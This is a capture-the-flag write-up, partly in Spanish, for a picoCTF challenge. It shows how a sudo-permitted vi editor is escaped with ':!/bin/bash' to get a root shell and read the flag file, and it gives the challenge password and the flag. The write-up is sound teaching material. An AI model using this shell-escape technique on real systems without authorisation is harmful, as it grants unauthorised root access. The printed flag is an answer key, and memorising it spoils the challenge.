## Descripcion
Can you read files in the root file?
`ssh -p 63749 [picoplayer@saturn.picoctf.net](mailto:picoplayer@saturn.picoctf.net)`

Password: `j4ks-9nxB-`

Can you login and read the root file?


  
What permissions do you have?
## solucion 
```
JeeX7ZaZ-academy@webshell:~$ ssh -p 51470 picoplayer@saturn.picoctf.net
ssh: connect to host saturn.picoctf.net port 51470: Connection refused
JeeX7ZaZ-academy@webshell:~$ ssh -p 59310 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:59310 ([13.59.203.175]:59310)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:59310' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.17.0-1019-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ sudo vi
[sudo] password for picoplayer: 
--------------------------------------------------------------------------
----------------------Editor Vi-------------------------------------------------
|
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
:!/bin/bash
------------------------------------------------------------------------
------------------------------------------------------------------------

root@challenge:/home/picoplayer# ls -la /root
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Aug 30 03:33 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:/home/picoplayer# cat .flag.txt 
cat: .flag.txt: No such file or directory
root@challenge:/home/picoplayer# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
root@challenge:/home/picoplayer# 

















Solucion 2

picoplayer@challenge:~$ sudo vi /root/.flag.txt
[sudo] password for picoplayer: 
 
----------------------------------------------------------------------------
---------------------------------------------------------------------------
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
~                                                                                                                                                                                             
~                                                                                                                                                                                             
~                                                                                                                                                                                             
~                                                                                                                                                                                             
~                                                                                  -----------------------------------------------------------------------------    
picoplayer@challenge:~$

```

```
picoCTF{uS1ng_v1m_3dit0r_021d10ab}

```
## notas adicionales

Aprovechando que el editor VI es root
ejecutamos el siguiente comando desde vi 
:!/bin/bash

por lo que entendí, vi crea una nueva consola en Linux y esta hereda los permisos del padre ósea vi, ya desde ese punto fue buscar el archivo con la bandera y leerlo.

…
es mas fácil abrir el archivo directamente desde vi... claro antes debemos conocer los archivos que existen... 

## referencias

[Webshell](https://webshell.cylabacademy.org/)
[Google Gemini](https://gemini.google.com/app)
[vi - Wikipedia, la enciclopedia libre](https://es.wikipedia.org/wiki/Vi)